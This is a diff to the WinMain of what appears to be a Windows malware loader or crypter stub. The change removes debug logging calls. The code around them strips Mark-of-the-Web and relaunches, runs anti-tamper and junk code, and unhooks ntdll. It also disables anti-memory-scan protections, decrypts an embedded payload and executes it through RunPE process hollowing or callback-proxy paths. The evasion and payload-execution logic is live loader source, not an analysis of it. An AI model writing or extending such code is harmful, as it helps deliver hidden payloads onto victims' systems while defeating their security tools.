@@ -28,7 +28,6 @@
 #include "KeyDerive.h"
 #include "Phantom.h"
 #include "Motw.h"
-#include "IATLog.h"
 #include "AntiEmul.h"
 #include "TlsCallback.h"
 #include "GadgetPool.h"
@@ -274,7 +273,6 @@ namespace EntryDbg {
 // ═══════════════════════════════════════════════════════════════
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-    IATLog::Write("WinMain ENTER");
 
     // ── Step -2: MOTW Strip (L21) ──
     // Must run FIRST: if Zone.Identifier exists, strip it and relaunch
@@ -295,10 +293,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
     // ── Step 0: Anti-Tamper (Always Active) ──
     if (!Protection::VerifyIntegrity()) {
-        IATLog::Write("FAIL: VerifyIntegrity");
         return 0;
     }
-    IATLog::Write("OK: VerifyIntegrity");
     Protection::JunkCode();
 
     // ── Step 0b: TLS Callback Verification (L23, Always Active) ──
@@ -310,7 +306,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
     // ── Step 0c: Initialize CRC32C detection ──
     Crc32C::DetectSse42();
-    IATLog::Write("CRC32C init done");
 
     // ── Step 1: Unhook ntdll ──
     if (GlobalConfig.bKnownDllsUnhook) {
@@ -420,9 +415,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         memcpy(finalKey, KeyData.key, sizeof(finalKey));
     }
 
-    IATLog::Write("Config check starting");
-    IATLog::Write(GlobalConfig.bRunPE ? "RunPE=TRUE" : "RunPE=FALSE");
-    IATLog::Write(GlobalConfig.bIndirectSyscalls ? "IndirectSys=TRUE" : "IndirectSys=FALSE");
 
     // ── Step 8: Decrypt Payload ──
     if (GlobalConfig.researchPackage > 0) {
@@ -523,9 +515,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     else if (GlobalConfig.bRunPE) {
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
-        IATLog::Write(">>> RunPE path taken");
         GodMode::ExecutePayload(PayloadData.data, decryptSize, false, true);
-        IATLog::Write("<<< RunPE returned");
     }
     else if (GlobalConfig.bCallbackDiv) {
         // Layer 2: Callback Diversification — thread из kernel32 callback
@@ -539,7 +529,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         GodMode::ExecutePayload(PayloadData.data, decryptSize, true, false);
     }
     else {
-        IATLog::Write(">>> Default (CallbackProxy) path");
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         GodMode::ExecutePayload(PayloadData.data, decryptSize, false, false);
